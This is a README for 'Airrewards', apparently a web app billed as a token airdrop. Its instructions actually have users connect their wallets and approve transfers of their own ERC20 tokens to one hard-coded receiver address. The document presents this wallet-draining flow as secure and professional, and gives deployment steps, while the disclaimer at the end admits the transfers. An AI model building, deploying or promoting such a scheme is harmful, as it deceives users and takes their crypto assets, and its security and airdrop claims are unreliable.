# Airrewards - Token Airdrop Application

A professional web application for facilitating token airdrops on Ethereum Virtual Machine (EVM) networks. Users can easily connect their wallets and approve token transfers to a designated receiver address.

## 🌟 Features

- 🔐 **Secure Wallet Integration** - Support for MetaMask, TrustWallet, and other EVM-compatible wallets
- 💎 **Smart Contract Based** - Secure token transfer mechanism using Solidity
- 📱 **Responsive Design** - Beautiful, mobile and desktop compatible interface
- 🛡️ **Security First** - Input validation, secure smart contract interactions
- 🌍 **Multi-Network Support** - Works on Ethereum, BSC, Polygon, and other EVM networks
- 🚀 **Easy Deployment** - Docker support and VPS deployment instructions

## 🎯 Receiver Address

All approved tokens are transferred to: `0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0`

## 🚀 Quick Start

### Local Development

```bash
# Clone the repository
git clone <repository-url>
cd Airrewards

# Install dependencies
npm install

# Configure environment
cp .env.example .env

# Start the server
npm start
```

Visit `http://localhost:3000` in your browser.

### Docker Deployment

```bash
# Build and run with Docker Compose
docker-compose up -d

# View logs
docker-compose logs -f
```

## 📖 Documentation

For detailed deployment instructions, including VPS setup with Termius, see [DEPLOYMENT.md](DEPLOYMENT.md)

## 🏗️ Project Structure

```
Airrewards/
├── contracts/          # Solidity smart contracts
├── scripts/           # Deployment scripts
├── public/            # Frontend application
│   ├── index.html    # Main HTML file
│   ├── styles.css    # Responsive CSS
│   └── app.js        # Application logic
├── server.js         # Express server
├── hardhat.config.js # Hardhat configuration
├── Dockerfile        # Docker configuration
└── docker-compose.yml # Docker Compose setup
```

## 🔒 Security

- Input validation on all user inputs
- Secure smart contract interactions
- Protection against unauthorized transfers
- Security headers on server
- HTTPS recommended for production

## 📝 How to Use

1. **Connect Wallet** - Click "Connect Wallet" and approve the connection
2. **Enter Token Details** - Provide the ERC20 token contract address
3. **Specify Amount** - Enter the amount of tokens to transfer
4. **Approve & Transfer** - Review the receiver address and confirm the transaction

## 🛠️ Technologies

- **Frontend**: HTML5, CSS3, JavaScript (ES6+)
- **Web3 Integration**: Ethers.js v5
- **Backend**: Node.js, Express.js
- **Smart Contracts**: Solidity 0.8.20
- **Development**: Hardhat
- **Deployment**: Docker, Docker Compose

## 📦 Requirements

- Node.js 16+
- npm or yarn
- MetaMask or compatible Web3 wallet
- Docker (for containerized deployment)

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## ⚠️ Disclaimer

This application facilitates token transfers to a specific address (`0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0`). Users should understand the implications of approving token transfers before using the application. Always verify the receiver address before confirming transactions.

## 📄 License

MIT License - See LICENSE file for details